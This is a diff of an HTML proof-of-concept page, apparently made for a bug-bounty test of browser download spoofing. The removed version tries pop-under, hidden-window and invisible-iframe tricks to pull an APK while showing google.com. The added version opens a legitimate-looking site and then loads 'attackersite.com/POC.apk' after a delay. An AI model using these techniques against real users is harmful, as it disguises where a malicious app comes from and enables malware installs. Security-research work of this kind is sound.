@@ -1,6 +1,6 @@
 <html>
-<head>
-<meta charset="utf-8">
+ <head> 
+  <meta charset="utf-8">
 <style>
 .button {
   background-color: #4CAF50;
@@ -13,179 +13,18 @@
   font-size: 16px;
   margin: 4px 2px;
   cursor: pointer;
-  border-radius: 8px;
-  transition: background-color 0.3s;
-}
-
-.button:hover {
-  background-color: #45a049;
-}
-
-.container {
-  padding: 20px;
-  font-family: Arial, sans-serif;
-}
-
-.info {
-  background-color: #f8f9fa;
-  padding: 15px;
-  border-radius: 5px;
-  margin: 20px 0;
-  border-left: 4px solid #007bff;
 }
 </style>
-</head>
-<body>
-<div class="container">
-  <h2>VRP Testing - Download Spoofing POC</h2>
-  
-  <div class="info">
-    <strong>Testing Scenario:</strong> Pop-under dengan delayed APK download
-  </div>
-
-  <center>
-    <input type="button" class="button" value="Download From Original Site" onclick="initiateDownload()">
-    <br>
-    <input type="button" class="button" value="Advanced Spoofing" onclick="advancedSpoofing()" style="background-color: #007bff;">
-    <br>
-    <input type="button" class="button" value="Stealth Mode" onclick="stealthDownload()" style="background-color: #dc3545;">
-  </center>
-
-  <div id="status" style="margin-top: 20px; padding: 10px; background: #e9ecef; border-radius: 5px;"></div>
-</div>
-
-<script>
-let downloadAttempted = false;
-
-function logStatus(message) {
-  const statusEl = document.getElementById('status');
-  statusEl.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${message}</div>`;
-  statusEl.scrollTop = statusEl.scrollHeight;
+ </head> 
+ <body> 
+  <script>
+function a(){
+	window.open('https://anylegitsite.com', 'x');
+	setTimeout(function(){
+		window.open('https://attackersite.com/POC.apk', 'x');
+	}, 5000);
 }
-
-function initiateDownload() {
-  if (downloadAttempted) {
-    alert('Download sudah dilakukan sebelumnya!');
-    return;
-  }
-  
-  downloadAttempted = true;
-  logStatus('Memulai proses download...');
-  
-  // Buka pop-under Google
-  const popup = window.open('https://google.com', 'googleWindow', 
-    'width=800,height=600,left=1000,top=1000');
-  
-  logStatus('Pop-under Google dibuka');
-  
-  // Delay untuk APK download
-  setTimeout(function() {
-    try {
-      // Coba redirect popup ke APK
-      if (popup && !popup.closed) {
-        popup.location.href = 'https://google.com/POC.apk';
-        logStatus('Redirect popup ke APK');
-      } else {
-        // Fallback ke window baru
-        window.open('https://google.com/POC.apk', 'downloadWindow');
-        logStatus('Membuka window baru untuk download APK');
-      }
-    } catch (e) {
-      logStatus('Error: ' + e.message);
-      // Direct download
-      window.location.href = 'https://google.com/POC.apk';
-    }
-  }, 3000);
-}
-
-function advancedSpoofing() {
-  logStatus('Memulai advanced spoofing...');
-  
-  // Multiple popups strategy
-  const fakeWindow = window.open('https://google.com', 'fakeGoogle', 
-    'width=400,height=300,left=2000,top=2000');
-  
-  const downloadWindow = window.open('', 'downloadFrame', 
-    'width=1,height=1,left=3000,top=3000');
-  
-  setTimeout(() => {
-    // Redirect download window ke APK
-    if (downloadWindow) {
-      downloadWindow.location.href = 'https://google.com/POC.apk';
-      logStatus('Hidden window redirected ke APK');
-    }
-    
-    // Close fake window setelah beberapa detik
-    setTimeout(() => {
-      if (fakeWindow && !fakeWindow.closed) {
-        fakeWindow.close();
-        logStatus('Fake window ditutup');
-      }
-    }, 2000);
-    
-  }, 2000);
-}
-
-function stealthDownload() {
-  logStatus('Memulai stealth download...');
-  
-  // User interaction simulation
-  const userInteracted = confirm('Klik OK untuk melanjutkan download...');
-  
-  if (userInteracted) {
-    // Create invisible iframe untuk download
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = 'https://google.com/POC.apk';
-    document.body.appendChild(iframe);
-    
-    logStatus('Stealth download dimulai via iframe');
-    
-    // Backup: Blob download
-    setTimeout(() => {
-      simulateBlobDownload();
-    }, 1000);
-  }
-}
-
-function simulateBlobDownload() {
-  // Simulasi download menggunakan Blob (untuk testing)
-  const fakeContent = 'Ini adalah simulated APK content untuk testing VRP';
-  const blob = new Blob([fakeContent], { type: 'application/vnd.android.package-archive' });
-  const url = URL.createObjectURL(blob);
-  
-  const a = document.createElement('a');
-  a.href = url;
-  a.download = 'POC_TEST.apk';
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
-  URL.revokeObjectURL(url);
-  
-  logStatus('Simulated APK download completed');
-}
-
-// Auto-detect mobile devices
-function detectMobileAndAutoDownload() {
-  const isMobile = /Android|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent);
-  
-  if (isMobile && !downloadAttempted) {
-    logStatus('Mobile device terdeteksi - siap untuk auto-download');
-    
-    // Optional: Auto-download setelah delay
-    setTimeout(() => {
-      if (confirm('Download aplikasi sekarang?')) {
-        initiateDownload();
-      }
-    }, 5000);
-  }
-}
-
-// Initialize
-window.addEventListener('load', () => {
-  logStatus('VRP Testing Environment Ready');
-  detectMobileAndAutoDownload();
-});
-</script>
-</body>
+</script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ </body>
 </html>
